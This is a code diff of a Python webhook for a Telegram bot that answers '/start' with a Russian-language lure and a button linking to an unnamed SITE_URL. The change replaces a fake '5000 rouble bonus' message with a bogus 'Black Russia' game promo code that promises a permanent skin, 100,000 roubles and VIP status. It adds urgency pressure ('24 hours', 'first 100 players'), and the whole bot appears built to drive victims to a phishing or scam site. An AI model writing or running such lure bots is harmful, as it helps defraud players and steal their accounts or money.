@@ -16,17 +16,17 @@ class handler(BaseHTTPRequestHandler):
             chat_id = msg.get("chat", {}).get("id")
             text = msg.get("text", "")
             if chat_id and text == "/start":
-                reply = f"Привет! Твой бонус 5000 рублей ждёт.\nЗабери здесь: {SITE_URL}"
+                reply = "❄️ ЗИМНИЙ ПРОМОКОД BLACK RUSSIA\n\nТебе выпал новогодний набор:\n\n🎁 Скин «Коньки мужские» — НАВСЕГДА\n💰 100.000 ₽ на аккаунт\n👑 VIP Platinum на 7 дней\n\n⏳ Промокод действует 24 часа\n🔥 Только для первых 100 игроков\n\n👇 Активировать:"
                 requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-             json={
-                 "chat_id": chat_id,
-                 "text": reply,
-                 "reply_markup": {
-                     "inline_keyboard": [[
-                         {"text": "🎁 ЗАБРАТЬ БОНУС", "url": SITE_URL}
-                     ]]
-                 }
-             })
+                             json={
+                                 "chat_id": chat_id,
+                                 "text": reply,
+                                 "reply_markup": {
+                                     "inline_keyboard": [[
+                                         {"text": "❄️ ЗАБРАТЬ ПРОМОКОД", "url": SITE_URL}
+                                     ]]
+                                 }
+                             })
         except Exception:
             pass
         self.send_response(200)
